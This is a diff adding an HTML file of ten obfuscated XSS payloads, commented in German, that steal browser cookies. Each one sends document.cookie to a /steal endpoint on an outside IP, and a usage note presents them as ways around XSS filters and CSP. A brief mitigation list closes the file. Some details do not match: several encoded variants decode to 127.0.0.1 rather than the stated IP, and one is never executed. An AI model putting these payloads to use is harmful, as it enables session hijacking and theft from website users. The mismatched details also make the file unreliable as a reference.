@@ -1,0 +1,83 @@
+<!--
+XSS Cookie Stealer - Obfuscated Payloads
+Verschiedene Verschleierungstechniken um XSS-Filter zu umgehen
+-->
+
+<!-- 1. BASE64-ENCODED PAYLOAD -->
+<script>eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMjcuMC4wLjE6ODg4OC9zdGVhbD9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSkp'))</script>
+
+<!--
+Decoded: fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))
+-->
+
+
+<!-- 2. HEX-ENCODED -->
+<script>eval('\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x38\x38\x38\x38\x2f\x73\x74\x65\x61\x6c\x3f\x63\x3d\x27\x2b\x65\x6e\x63\x6f\x64\x65\x55\x52\x49\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x29')</script>
+
+
+<!-- 3. UNICODE-ESCAPED -->
+<script>eval('\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u003a\u0038\u0038\u0038\u0038\u002f\u0073\u0074\u0065\u0061\u006c\u003f\u0063\u003d\u0027\u002b\u0065\u006e\u0063\u006f\u0064\u0065\u0055\u0052\u0049\u0043\u006f\u006d\u0070\u006f\u006e\u0065\u006e\u0074\u0028\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065\u0029\u0029')</script>
+
+
+<!-- 4. STRING CONCATENATION -->
+<script>
+var a='fet'+'ch';
+var b='http:'+'//141.87.56.31:8888';
+var c='/ste'+'al?c=';
+window[a](b+c+encodeURIComponent(document.cookie));
+</script>
+
+
+<!-- 5. CHAR CODE CONSTRUCTION -->
+<script>
+String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,56,56,56,56,47,115,116,101,97,108,63,99,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41)
+</script>
+
+
+<!-- 6. EXPRESSION EVALUATION -->
+<img src=x onerror="this.src='http://141.87.56.31:8888/steal?c='+escape(document.cookie)">
+
+
+<!-- 7. JAVASCRIPT URL PROTOCOL -->
+<iframe src="javascript:void(fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie)))"></iframe>
+
+
+<!-- 8. DATA URL -->
+<object data="data:text/html,<script>fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))</script>"></object>
+
+
+<!-- 9. MIXED CASE + HTML ENTITIES -->
+<ScRiPt>fetch('&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#49;&#50;&#55;&#46;&#48;&#46;&#48;&#46;&#49;&#58;&#56;&#56;&#56;&#56;&#47;&#115;&#116;&#101;&#97;&#108;&#63;&#99;&#61;'+encodeURIComponent(document.cookie))</ScRiPt>
+
+
+<!-- 10. COMMENT BREAKING -->
+<script>/*
+*/fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))/*
+*/</script>
+
+
+<!--
+Verwendung:
+Diese Payloads sind nützlich wenn:
+- XSS-Filter aktiv sind (z.B. ModSecurity)
+- <script> Tags gefiltert werden
+- Bestimmte Keywords blockiert sind
+- Content Security Policy umgangen werden muss
+
+Testing:
+Teste verschiedene Varianten nacheinander
+Überwache Browser Developer Console für Fehler
+Prüfe Network Tab für ausgehende Requests
+
+Advanced Obfuscation Tools:
+- JSFuck (http://www.jsfuck.com)
+- JJencode (http://utf-8.jp/public/jjencode.html)
+- AAencode (http://utf-8.jp/public/aaencode.html)
+
+Mitigation gegen Obfuscation:
+- Strikte CSP (Content Security Policy)
+- Keine eval() oder new Function() erlauben
+- Nonce-based CSP für inline scripts
+- Sandboxed IFrames
+- Input Sanitization (nicht nur Filtering!)
+-->
